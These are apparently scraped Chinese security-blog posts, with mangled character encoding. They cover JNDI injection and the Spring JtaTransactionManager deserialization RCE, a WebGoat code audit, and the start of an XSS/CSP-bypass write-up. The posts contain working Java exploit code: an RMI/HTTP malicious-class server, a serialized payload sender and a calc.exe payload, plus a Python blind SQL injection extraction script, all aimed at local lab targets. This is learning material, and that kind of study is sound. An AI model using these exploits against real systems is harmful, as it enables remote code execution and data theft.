æœ€ç»ˆä¸‹è½½æ¶æ„ç±»çš„åœ°å€ä¸ºhttp:&#x2F;&#x2F;127.0.0.1:8000&#x2F;ExportObject.classReference reference &#x3D; new Reference(&quot;ExportObject&quot;, &quot;ExportObject&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;&quot;);&#x2F;&#x2F; ReferenceåŒ…è£…ç±»ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);registry.bind(&quot;Object&quot;, referenceWrapper); 1999ç«¯å£æ³¨å†Œäº†RMIæœåŠ¡ï¼Œè®¾ç½®code urlä¸ºhttp://http://127.0.0.1:8000/ï¼Œå®é™…ç±»åŠ è½½ä½ç½®ä¸ºhttp://127.0.0.1:8000/ExportObject.classï¼Œç»‘å®šäº†Objectï¼ŒJNDIè°ƒç”¨çš„åœ°å€ä¸ºhttp://127.0.0.1:8000/Object æ§åˆ¶äº†æ¶æ„ç±»ExportObjectå°±èƒ½RCE JNDIæµ‹è¯•demo Persionç±» 1234567891011121314151617181920212223242526272829303132333435363738import java.io.IOException;import java.io.Serializable;import java.rmi.Remote;public class Person implements Remote,Serializable &#123; private static final long serialVersionUID = 1L; private String name; private String password; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password = password; &#125; public String toString()&#123; return \"name:\"+name+\" password:\"+password; &#125; private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³• in.defaultReadObject(); //æ‰§è¡Œå‘½ä»¤ Runtime.getRuntime().exec(\"calc.exe\"); &#125;&#125; æœåŠ¡ç«¯rmiä¸ºä¾‹ 1234567891011121314151617181920212223242526272829303132333435363738import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;public class Test3 &#123; public static void initPerson() throws Exception&#123; //é…ç½®JNDIå·¥å‚å’ŒJNDIçš„urlå’Œç«¯å£ã€‚å¦‚æœæ²¡æœ‰é…ç½®è¿™äº›ä¿¡æ¯ï¼Œä¼šå‡ºç°NoInitialContextExceptionå¼‚å¸¸ //é…ç½®rmi LocateRegistry.createRegistry(3001); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:3001\"); ////åˆå§‹åŒ– InitialContext ctx = new InitialContext(); //å®ä¾‹åŒ–personå¯¹è±¡ Person p = new Person(); p.setName(\"hello\"); p.setPassword(\"jndi\"); //personå¯¹è±¡ç»‘å®šåˆ°JNDIæœåŠ¡ä¸­ï¼ŒJNDIçš„åå­—å«åšï¼špersonã€‚ ctx.bind(\"person\", p); ctx.close(); &#125; public static void findPerson() throws Exception&#123; //å› ä¸ºå‰é¢å·²ç»å°†JNDIå·¥å‚å’ŒJNDIçš„urlå’Œç«¯å£å·²ç»æ·»åŠ åˆ°Systemå¯¹è±¡ä¸­ï¼Œè¿™é‡Œå°±ä¸ç”¨åœ¨ç»‘å®šäº† InitialContext ctx = new InitialContext(); //é€šè¿‡lookupæŸ¥æ‰¾personå¯¹è±¡ Person person = (Person) ctx.lookup(\"person\"); //æ‰“å°å‡ºè¿™ä¸ªå¯¹è±¡ System.out.println(person.toString()); ctx.close(); &#125; public static void main(String[] args) throws Exception &#123; initPerson(); findPerson(); &#125;&#125; æœ¬æ¥æ˜¯è¯»å–personç±»çš„ä¿¡æ¯ï¼Œåœ¨personç±»ä¸­åŠ ä¸Šäº†readObject()æ–¹æ³•ï¼ŒæˆåŠŸRCE Jndiæ³¨å…¥äº§ç”Ÿçš„åŸå›  1ã€lookupå‚æ•°å¯æ§ã€‚ 2ã€InitialContextç±»åŠä»–çš„å­ç±»çš„lookupæ–¹æ³•å…è®¸åŠ¨æ€åè®®è½¬æ¢ 3ã€lookupæŸ¥æ‰¾çš„å¯¹è±¡æ˜¯Referenceç±»å‹åŠå…¶å­ç±» 4ã€å½“è¿œç¨‹è°ƒç”¨ç±»çš„æ—¶å€™é»˜è®¤ä¼šåœ¨rmiæœåŠ¡å™¨ä¸­çš„classpathä¸­æŸ¥æ‰¾ï¼Œå¦‚æœä¸å­˜åœ¨å°±ä¼šå»urlåœ°å€å»åŠ è½½ç±»ã€‚å¦‚æœéƒ½åŠ è½½ä¸åˆ°å°±ä¼šå¤±è´¥ã€‚ è·Ÿè¿›lookup() è·Ÿè¿›getURLOrDefaultInitCtx(name) å³ä½¿ä¸€å¼€å§‹è®¾ç½®äº†Contextï¼Œä¹Ÿæ˜¯å¯ä»¥é‡å†™ä¸ºæˆ‘ä»¬ä¼ å…¥çš„lookup()çš„å‚æ•° ä¸¾ä¾‹ 12345678&#x2F;&#x2F; Create the initial contextHashtable env &#x3D; new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);env.put(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;secure-server:1099&quot;);Context ctx &#x3D; new InitialContext(env);&#x2F;&#x2F; Look up in the local RMI registryObject local_obj &#x3D; ctx.lookup(&lt;attacker controlled&gt;); Spring RCE Spring RCEå½¢æˆçš„ä¸»è¦åŸå› æ˜¯ Springæ¡†æ¶çš„spring-tx-xxx.jarä¸­çš„org.springframework.transaction.jta.JtaTransactionManager å­˜åœ¨ä¸€ä¸ªreadObjectæ–¹æ³•ã€‚å½“æ‰§è¡Œå¯¹è±¡ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œlookupæ“ä½œï¼Œå¯¼è‡´äº†jndiæ³¨å…¥ï¼Œå¯ä»¥å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œé—®é¢˜ ç¯å¢ƒæ­å»º+POC mvn installå‡ºç°æŠ¥é”™[ERROR] ä¸å†æ”¯æŒæºé€‰é¡¹ 5ã€‚è¯·ä½¿ç”¨ 6 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚ pom.xmlä¸­å¢åŠ mavenç¼–è¯‘çš„jdkç‰ˆæœ¬è®¾ç½® 123456789&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt; &lt;version&gt;3.3&lt;&#x2F;version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;&#x2F;source&gt; &lt;target&gt;1.8&lt;&#x2F;target&gt; &lt;&#x2F;configuration&gt;&lt;&#x2F;plugin&gt; å‘ç°è¿˜æ˜¯æ²¡ç”¨,Terminalé‡Œé¢çš„javaç‰ˆæœ¬å§‹ç»ˆæ˜¯java11 è§£å†³åŠæ³•ï¼šhelpâ€“&gt;find action ï¼Œè¾“å…¥switch boot jdkï¼Œåˆ‡æ¢æˆè‡ªå·±çš„jdkå³å¯ æŠŠjaråŒ…ä¸‹è½½ä¸‹æ¥ï¼Œåˆ†æä¸€ä¸‹æºç  åˆ©ç”¨ideaè‡ªå¸¦çš„åç¼–è¯‘ï¼Œadd as libraryï¼Œæ³¨æ„æœ€å¥½æ·»åŠ ä¸ºGlobalï¼Œå¦åˆ™å¯èƒ½ä¼šæ‰¾ä¸åˆ°ç±» org.springframework.transaction.jta.JtaTransactionManager å½“ä¸€ä¸ªç±»è¢«ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨è¯¥ç±»çš„readObject()æ–¹æ³•ï¼Œè·Ÿè¿›initUserTransactionAndTransactionManager()æ–¹æ³• è·Ÿè¿›lookupUserTransaction() è°ƒç”¨JndiTemplate.lookup()ï¼Œè¿½è¸ªlookup() è·Ÿè¿›lookup() æ€»ç»“ä¸€ä¸‹è°ƒç”¨é“¾ JtaTransactionManager-&gt;readObject()-&gt;initUserTransactionAndTransactionManager() -&gt;lookupUserTransaction(this.userTransactionName)ï¼Œè¿™é‡Œçš„userTransactionNameæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼ˆsetUserTransactionName()ï¼‰ï¼Œæœ€ç»ˆè§¦å‘ JndiTemplateçš„lookup(userTransactionName)è§¦å‘RCEã€‚æˆ‘ä»¬éœ€è¦æ³¨å†Œä¸€ä¸ªrmiæœåŠ¡ï¼Œå¹¶æä¾›æ¶æ„ç±»ã€‚ æ¼æ´å®ç° å®¢æˆ·ç«¯demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package client.src.main.java;import java.io.IOException;import java.io.ObjectOutputStream;import java.net.InetSocketAddress;import java.net.Socket;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.Reference;import org.springframework.transaction.jta.JtaTransactionManager;import com.sun.jndi.rmi.registry.ReferenceWrapper;import com.sun.net.httpserver.HttpServer;/*** * * @author admin@iswin.org * @time 2016.1.24 */@SuppressWarnings(\"restriction\")public class ExploitClient &#123; /*** * å¯åŠ¨httpæœåŠ¡å™¨ï¼Œæä¾›ä¸‹è½½è¿œç¨‹è¦è°ƒç”¨çš„ç±» * * @throws IOException */ public static void lanuchCodebaseURLServer() throws IOException &#123; System.out.println(\"Starting HTTP server\"); HttpServer httpServer = HttpServer.create(new InetSocketAddress(8000), 0); httpServer.createContext(\"/\", new HttpFileHandler()); httpServer.setExecutor(null); httpServer.start(); &#125; /*** * å¯åŠ¨RMIæœåŠ¡ * * @throws Exception */ public static void lanuchRMIregister() throws Exception &#123; System.out.println(\"Creating RMI Registry\"); Registry registry = LocateRegistry.createRegistry(1999); // è®¾ç½®code url è¿™é‡Œå³ä¸ºhttp://http://127.0.0.1:8000/ // æœ€ç»ˆä¸‹è½½æ¶æ„ç±»çš„åœ°å€ä¸ºhttp://127.0.0.1:8000/ExportObject.class Reference reference = new Reference(\"ExportObject\", \"ExportObject\", \"http://127.0.0.1:8000/\"); // ReferenceåŒ…è£…ç±» ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"Object\", referenceWrapper); &#125; /*** * å‘é€payload * * @throws Exception */ public static void sendPayload() throws Exception &#123; // jndiçš„è°ƒç”¨åœ°å€ String jndiAddress = \"rmi://127.0.0.1:1999/Object\"; // å®ä¾‹åŒ–JtaTransactionManagerå¯¹è±¡ï¼Œå¹¶ä¸”åˆå§‹åŒ–UserTransactionNameæˆå‘˜å˜é‡ JtaTransactionManager object = new JtaTransactionManager(); object.setUserTransactionName(jndiAddress); // å‘é€æ„é€ å¥½çš„payload Socket socket = new Socket(\"127.0.0.1\", 9999); System.out.println(\"Sending object to server...\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream()); objectOutputStream.writeObject(object); objectOutputStream.flush(); socket.close(); &#125; public static void main(String[] args) throws Exception &#123; lanuchCodebaseURLServer(); lanuchRMIregister(); sendPayload(); &#125;&#125; æœåŠ¡ç«¯ 123456789101112131415161718192021222324252627package server.src.main.java;import java.io.*;import java.net.*;public class ExploitableServer &#123; public static void main(String[] args) &#123; try &#123; int port = 9999; ServerSocket serverSocket = new ServerSocket(port); System.out.println(\"Server started on port \"+serverSocket.getLocalPort()); while(true) &#123; Socket socket=serverSocket.accept(); System.out.println(\"Connection received from \"+socket.getInetAddress()); ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream()); try &#123; Object object = objectInputStream.readObject(); System.out.println(\"Read object \"+object); &#125; catch(Exception e) &#123; System.out.println(\"Exception caught while reading object\"); e.printStackTrace(); &#125; &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; payload 123456789101112131415import sun.awt.windows.ThemeReader;public class ExportObject &#123; public ExportObject() &#123; try &#123; while(true) &#123; System.out.println(\"running injected code...\"); Runtime.getRuntime().exec(\"calc.exe\"); Thread.sleep(1000); &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; åˆ‡æ¢javaç‰ˆæœ¬ä¸º1.8.0_112ï¼ŒæˆåŠŸ ä¸è¿‡è¿™åªæ˜¯æ¨¡æ‹Ÿäº†æ¼æ´çš„è§¦å‘è¿‡ç¨‹ï¼Œå®¢æˆ·ç«¯ä¹Ÿå°±æ˜¯æ”»å‡»ç«¯ï¼Œå¼€ä¸ªhttpæœåŠ¡8000ï¼Œæ³¨å†ŒrmiæœåŠ¡åˆ°8000ä¸Šï¼Œå¹¶ç»‘å®šæ¶æ„ç±»ã€‚ç„¶åå¼€ä¸ªsocketæœåŠ¡å‘é€payloadåˆ°9999ç«¯å£ï¼Œè¿™é‡Œçš„payloadæ˜¯å°±æ˜¯å°†JtaTransactionManagerååºåˆ—åŒ–ï¼Œå¹¶è®¾ç½®object.setUserTransactionName(jndiAddress);ã€‚String jndiAddress = &quot;rmi://127.0.0.1:1999/Object&quot;;ï¼Œå®é™…æŸ¥æ‰¾ä½ç½®ä¸ºå‰é¢rmiç»‘å®šçš„http://127.0.0.1:8000/Objectã€‚ æœåŠ¡ç«¯å°±æ˜¯å¼€ä¸ªsocketæœåŠ¡ä»9999ç«¯å£æ¥å—æ•°æ®ï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ–ï¼Œè‡ªåŠ¨è§¦å‘readobject()ï¼Œç„¶åæœ€ç»ˆè§¦å‘lookup()ï¼Œjndiè®¿é—®æˆ‘ä»¬æ³¨å†Œçš„rmiæœåŠ¡ï¼Œè§¦å‘æ¶æ„ç±»çš„æ„é€ å‡½æ•°ã€‚ åˆ©ç”¨æ¡ä»¶ 1ã€å­˜åœ¨æ¥å£è¿›è¡Œåºåˆ—åŒ–æ“ä½œ 2ã€è®¿é—®å¯¹è±¡å¯ä»¥å‡ºç½‘ 3ã€ç›®æ ‡å¯¹è±¡ä¸­çš„CLASSPATHå­˜åœ¨Sping-tx-xxx.jar æ€»ç»“ Spring-tx-xx.jaræ–‡ä»¶ä¸æ˜¯ä¸­é—´ä»¶çš„é»˜è®¤ç»„ä»¶ï¼Œæ‰€ä»¥ï¼Œè¯¥æ¼æ´å°±æ¯”è¾ƒé¸¡è‚‹ ã€‚ å®é™…å·¥ç¨‹ä¸­å¯èƒ½ä¼šå­˜åœ¨å°†ç¼ºé™·jaræ–‡ä»¶æ”¾åœ¨ä¸­é—´ä»¶çš„ç±»åŠ è½½å™¨ä¸­çš„æƒ…å†µï¼Œ å³æ‰€æœ‰åº”ç”¨éƒ½å¯ä»¥è®¿é—®è¿™ä¸ªjarï¼Œé‚£ä¹ˆæ¼æ´å°±å¯ä»¥åˆ©ç”¨ PSï¼šæœ¬æ¥æƒ³æŠŠFastjsonååºåˆ—åŒ–æ¼æ´ä¹Ÿå†™åœ¨è¿™é‡Œçš„ï¼Œä½†æ˜¯é˜²æ­¢ç¯‡å¹…è¿‡é•¿ï¼Œå¦å†™ä¸€ç¯‡ğŸ¤¦â€â™‚ï¸ å‚è€ƒé“¾æ¥ï¼š https://xz.aliyun.com/t/2041 https://www.freebuf.com/vuls/115849.html https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"javaå®¡è®¡å…¥é—¨","slug":"javaå®¡è®¡å…¥é—¨","date":"2020-02-28T00:48:22.000Z","updated":"2020-03-02T07:36:52.558Z","comments":true,"path":"2020/02/28/javaå®¡è®¡å…¥é—¨/","link":"","permalink":"https://glotozz.github.io/2020/02/28/java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/","excerpt":"å¼€å§‹å­¦javağŸƒâ€â™€ï¸","text":"å¼€å§‹å­¦javağŸƒâ€â™€ï¸ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• å‡†å¤‡å·¥ä½œ WebGoat 8 å¼€å§‹å®¡è®¡ SqlInjection å‚è€ƒé“¾æ¥ï¼š ä¸€èˆ¬é¢è¯•éƒ½ä¼šé—®åˆ°javaæ¼æ´äº†è§£å˜›ï¼Œä¼šåˆ†æğŸ´ï¼Œä½†æˆ‘ä¸€èˆ¬éƒ½æ˜¯åˆ©ç”¨ç°æˆå·¥å…·æˆ–è€…expã€‚è¶è¿˜æ²¡å¼€å­¦æ—¶é—´æ¯”è¾ƒå¤šï¼Œå­¦ä¹ ä¸€ä¸‹javaä»£ç å®¡è®¡ã€‚ å‡†å¤‡å·¥ä½œå®‰è£… è¿è¡Œjavaç¨‹åºï¼šå…ˆç¼–è¯‘a.java=&gt;a.classï¼Œå› æ­¤.classç»“å°¾çš„å­—èŠ‚ç æ–‡ä»¶éœ€è¦åç¼–è¯‘ï¼Œå·¥å…·æˆ‘ä¸€èˆ¬ç”¨jadx javaå¹³å°ï¼šjava seï¼Œjava eeï¼Œjava meï¼Œä¸»è¦å­¦ä¹ ç¬¬äºŒä¸ªwebæœåŠ¡ å¸¸è§çš„javaæœåŠ¡å™¨ï¼š Tomcatã€Weblogicã€JBossã€GlassFish ï¼Œä¸»è¦å­¦ä¹ Tomcat Tomcatç›®å½•ç»“æ„ Tomcatéƒ¨ç½²æºç  javapmsä¸ºä¾‹ ä»¥SpringMVC+Spring+Hibernate+Freemarker+Html5+jQueryä¸ºæŠ€æœ¯æ ¸å¿ƒæ¶æ„ IDEA å¯¼å…¥é¡¹ç›®å¹¶æ·»åŠ tomcaté…ç½® IDEAè°ƒè¯•åŠŸèƒ½ å½“å‰é¡¹ç›®ç»“æ„ä¸å¤ªæ‡‚ï¼Œä¸çŸ¥é“å¦‚ä½•ä¸‹æ”¾æ–­ç‚¹ï¼Œè·³è¿‡ Maven-é¡¹ç›®ç®¡ç†å’Œæ„å»ºå·¥å…· Mavenæ˜¯ä¸€ç§è‡ªåŠ¨æ„å»ºé¡¹ç›®çš„æ–¹å¼ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è‡ªåŠ¨ä»æœ¬åœ°å’Œè¿œç¨‹ä»“åº“æ‹‰å–å…³è”jaråŒ…ã€‚ éƒ¨ç½²WebGoatä¸ºä¾‹ï¼Œå¯¼å…¥é¡¹ç›® å®Œæˆä¹‹åbackgroundå°±å¼€å§‹ä¸‹è½½ï¼Œä½†æ˜¯é€Ÿåº¦ Fortify ä»£ç å®¡è®¡å·¥å…· æš‚æ—¶å…ˆä¹Ÿä¸ç”¨ WebGoat 8 WebGoat8æ˜¯åŸºäºSpring bootæ¡†æ¶å¼€å‘,æ•…æ„ä¸å®‰å…¨çš„Webåº”ç”¨ç¨‹åºï¼Œæ—¨åœ¨æ•™æˆWebåº”ç”¨ç¨‹åºå®‰å…¨æ€§è¯¾ç¨‹ã€‚ éœ€è¦çš„ç¯å¢ƒï¼šjava 11ã€Maven &gt; 3.2.1ã€IDEA å®‰è£… 1234git clone https:&#x2F;&#x2F;github.com&#x2F;WebGoat&#x2F;WebGoat.gitcd WebGoatmvn clean package -Dmaven.test.skip&#x3D;truemvn -pl webgoat-server spring-boot:run -Dmaven.test.skip&#x3D;true å› ä¸ºæˆ‘æœ‰ä¸ªåŒ…ä¸‹è½½å¤±è´¥äº†å°±è·³è¿‡è¿™ä¸ªåŒ… æœ€åæ˜¯å¦‚ä¸‹çš„ç•Œé¢ import WebGoatåˆ°IDEA è¿›è¡Œä»£ç æŸ¥çœ‹åŠè°ƒè¯• å‘ç°å·²ç»é…ç½®å¥½äº† ç»„ä»¶å®‰å…¨ ä¹Ÿæš‚æ—¶è·³è¿‡ Dependency-Checkæ˜¯OWASPï¼ˆOpen Web Application Security Projectï¼‰çš„ä¸€ä¸ªå®ç”¨å¼€æºç¨‹åº ã€‚ é¡¹ç›®åœ°å€ä»¥åŠå‚è€ƒæ•™ç¨‹ å¼€å§‹å®¡è®¡ç¬¬ä¸€ä¸ªé¡µé¢æ˜¯ç™»å½•ï¼Œç™»å½•æ˜¯å¾ˆå®¹æ˜“å­˜åœ¨æ¼æ´çš„åŠŸèƒ½ç‚¹ä¹‹ä¸€ã€‚ æ²¡å­¦è¿‡Spring bootæ¡†æ¶ï¼Œæ—¢ç„¶è·¯ç”±æ˜¯/loginï¼Œå…¨å±€æœç´¢login æ‰¾åˆ°org/owasp/webgoat/WebSecurityConfig.java å¤§è‡´èƒ½çœ‹æ‡‚ï¼Œä½†æ˜¯æ¼æ´çœ‹ä¸å‡ºæ¥==ï¼Œå…ˆçœ‹ä¸‹é¢è¿™ä¸ªç±»ä¼¼è®¤è¯çš„æ–¹æ³• æŸ¥é˜…AuthenticationManagerBuilder auth ï¼Œå…è®¸è½»æ¾æ„å»ºå†…å­˜èº«ä»½éªŒè¯ï¼ŒLDAPèº«ä»½éªŒè¯ï¼ŒåŸºäºJDBCçš„èº«ä»½éªŒè¯ï¼Œæ·»åŠ UserDetailsServiceä»¥åŠæ·»åŠ AuthenticationProviderã€‚ é‚£ä¹ˆè¿½è¸ªuserDetailsService 1private final UserService userDetailsService; è¿½è¸ªUserService å’Œæ–‡ç« ä¸€æ ·ï¼ŒuserRepository.findByUsername(username)çŒœæµ‹æ˜¯æ•°æ®åº“æŸ¥è¯¢ï¼Œ è¿½è¸ª æ˜¯ä¸ªæ¥å£ï¼Œè¿½è¸ª è¿˜æ˜¯ä¸ªæ¥å£ï¼Œå®ç°äº†æ›´å¤šæ–¹æ³•ï¼Œç»§ç»­è¿½è¸ªï¼Œæœ€ååˆ°Repositoryæ¥å£æˆ‘ä¹Ÿæ²¡æ‰¾åˆ°å®ç°è¿™ä¸ªæ¥å£çš„ä»£ç  è¿™æ˜¯ä¸ªå¯¼å…¥çš„åŒ…ï¼Œçœ‹æ¥å·²ç»é«˜åº¦é›†æˆï¼Œé‚£ä¹ˆåªéœ€è¦çŸ¥é“å…¶ç”¨æ³•å³å¯ [Spring Boot æ­ç§˜ä¸å®æˆ˜ï¼ˆäºŒï¼‰] å®ä½“å¯¹è±¡ åˆ›å»ºä¸€ä¸ª Author å®ä½“ï¼ŒçœŸå®çš„è¡¨åæ˜¯ t_authorï¼ŒåŒ…å« idï¼ˆè‡ªå¢ä¸»é”®ï¼‰ã€ realNameã€ nickname å­—æ®µã€‚ 123456789101112131415@Entity@Table(name &#x3D; &quot;t_author&quot;)public class Author&#123; @Id @GeneratedValue(strategy &#x3D; GenerationType.AUTO) private Long id; @Column(name&#x3D;&quot;real_name&quot;) private String realName; @Column(name&#x3D;&quot;nick_name&quot;) private String nickName; &#x2F;&#x2F; SETå’ŒGETæ–¹æ³•&#125; DAOç›¸å…³ 1234567public interface AuthorRepository extends JpaRepository&lt;Author, Long&gt; &#123; List&lt;Author&gt; findAll(); @Query(&quot;from Author where id &#x3D; :id&quot;) Author findAuthor(@Param(&quot;id&quot;) Long id);&#125; è¿™ä¸ªfromçš„æ˜¯å¯¹è±¡åï¼Œæ„Ÿè§‰ç±»ä¼¼äºé¢„ç¼–è¯‘ï¼Œèƒ½é˜²æ­¢sqlæ³¨å…¥ SpringBootæŸ¥è¯¢findByè§„åˆ™ æ‰€ä»¥ä¸Šé¢çš„ç±»ä¼¼äºfileByUsername()ç±»ä¼¼äº 1... where username&#x3D;?1 æ—¢ç„¶ä¸å­˜åœ¨sqlæ³¨å…¥ï¼Œç»§ç»­å›å»çœ‹ createUser()åï¼Œåœ¨ä¹‹å‰public WebGoatUser loadUserByUsername(String username)çš„return webGoatUseråæ‰“ä¸Šæ–­ç‚¹ï¼Œå¹¶æ‰§è¡Œä¸‹ä¸€æ­¥ï¼Œè·³è½¬å¦‚ä¸‹ åœ¨è¿›è¡Œæ¯”è¾ƒã€‚ æ³¨å†ŒåŠŸèƒ½ å…¨å±€æœç´¢è·¯ç”±/registration è¿½è¸ªvalidate() ä¹‹åå°±æ˜¯addUser()ï¼Œè·Ÿè¸ªä¸‹å‘ç°ä¹Ÿæ˜¯åˆ©ç”¨å°è£…å¥½çš„save()æ’å…¥æ•°æ®åº“ è¯´å¥½çš„ä¸å®‰å…¨å‘¢ï¼Ÿï¼ŸåŸæ¥æ˜¯è¦ç™»å½•è¿›å»æ‰å¼€å§‹å®éªŒ SqlInjectionå…¨å±€æœç´¢sqlinjectionå°±èƒ½æ‰¾åˆ°æºç  æŸ¥è¯¢çš„æ•°æ®ä¸­department=Marketingæ‰æœ‰å›æ˜¾ å°è¯•è”åˆæ³¨å…¥ 1select * from employees where department&#x3D;&#39;Marketing&#39; union select 1,2,3,&#39;Marketing&#39;,5,database() Something went wrongï¼Œåº”è¯¥æ˜¯ä¸æ”¯æŒè¿™ç§è¯­æ³•ï¼Œè¿½è¸ªä¸‹æ•°æ®åº“ ä¸çŸ¥é“æ˜¯å•¥ç±»å‹ï¼Œæµ‹è¯•å‘ç°ç›²æ³¨ä¹Ÿä¸è¡Œï¼Œå’Œmysqlä¸æ˜¯ä¸€ä¸ªè¯­æ³•çš„ã€‚ã€‚è¿™å…³ä¼¼ä¹åªæ˜¯ç†Ÿæ‚‰sqlè¯­æ³• challenge-9 sqlè¯­å¥å·²ç»ç»™äº†ï¼Œç®€å•çš„æ‹¼æ¥ã€‚ã€‚ æŸ¥çœ‹æŒ‘æˆ˜org/owasp/webgoat/sql_injection/advanced/SqlInjectionChallenge.java æ˜æ˜¾é—®é¢˜å‡ºåœ¨checkUserQueryï¼Œæ˜¯ä¸ªå¸ƒå°”ç›²æ³¨ï¼Œå¦‚æœæ˜¯mysqlå°±ä¸å†™äº†ï¼Œè¿™é‡Œå†™ä¸ªè„šæœ¬è¯•è¯• è¿™é‡Œç”¨--å¯ä»¥æ³¨é‡Š substr()å¯ä»¥æˆªå–å­—ç¬¦ä¸² æ„é€ ä¸‹é¢çš„å‘ç°å›æ˜¾ä¸åŒ 12tom&#39;and &#39;1&#39;&#x3D;&#39;0&#39; -- tom&#39;and &#39;1&#39;&#x3D;&#39;1&#39; -- æ˜¯putè¯·æ±‚ï¼Œjsonæ ¼å¼è¿”å› HTTPåè®®ä¸­PUTå’ŒPOSTä½¿ç”¨åŒºåˆ« å†™ä¸ªè„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python2# coding=utf-8import requestsimport jsons = requests.session()cookies = &#123; 'JSESSIONID' :'XQ9kMiDyU_tr5apUdGewRRG4qIq7-5uQtiOObyRw'&#125;url = \"http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(97, 127): payload = \"password\" param = \"tom' and ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125; and '1'='1\".format(payload, str(i), str(j)) print(param) data = &#123; 'username_reg':param, 'email_reg':'bb%40qq.com', 'password_reg':'cc', 'confirm_password_reg':'cc' &#125; r = requests.put(url=url, headers=headers, data=data, cookies=cookies) # r = requests.post(url=url, headers=headers, cookies=cookies, data=data) c = json.dumps(r.json()) # print(c) if \"already\" in c: tmp = 0 flag = flag + chr(j) print(flag) breakprint(flag) æœ€åï¼Œæœ‰ç©ºåˆ†æä¸€ä¸‹springä¸­çš„ååºåˆ—åŒ–æ¼æ´å’ŒFastJsonååºåˆ—åŒ–æ¼æ´ï¼Œçœ‹äº†åŸç†è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“ç†è§£çš„ã€‚ å‚è€ƒé“¾æ¥ï¼š https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42149&amp;fromuid=365932 https://www.freebuf.com/vuls/214039.html","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"XSS&bypass CSP","slug":"XSS-bypass-CSP","date":"2020-02-27T02:01:25.000Z","updated":"2020-02-27T13:13:56.969Z","comments":true,"path":"2020/02/27/XSS-bypass-CSP/","link":"","permalink":"https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/","excerpt":"ä»å‡ é“é¢˜å­¦ä¹ XSSä»¥åŠä¸€äº›ç›¸å…³ç»•è¿‡å§¿åŠ¿","text":"ä»å‡ é“é¢˜å­¦ä¹ XSSä»¥åŠä¸€äº›ç›¸å…³ç»•è¿‡å§¿åŠ¿ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• hgame-Cosmosçš„èŠå¤©å®¤1 hgame-ComcosèŠå¤©å®¤2 RealWorld CTF2019-Mission Invisible RealWorld CTF2019-Hcorme CODEGATE 2020 CSPç»•è¿‡ 0ctf2018-h4xors.club2 å‚è€ƒé“¾æ¥ï¼š hgame-Cosmosçš„èŠå¤©å®¤1ç¯å¢ƒå…³äº†ï¼Œåªèƒ½yyä¸€ä¸‹äº†==ï¼ è¿‡æ»¤äº†æ‰€æœ‰é—­åˆæ ‡ç­¾scriptã€iframeç­‰ï¼šre.sub(&quot;&lt;\\/?[^&gt;]+&gt;&quot;, &quot;&quot;, message),å¹¶è½¬åŒ–ä¸ºå¤§å†™ ç”¨æµè§ˆå™¨äº‹ä»¶æ‰§è¡Œjsï¼Œä¸é—­åˆå³æ ‡ç­¾æ—¶ä¼šè‡ªåŠ¨è¡¥å…¨ payload1 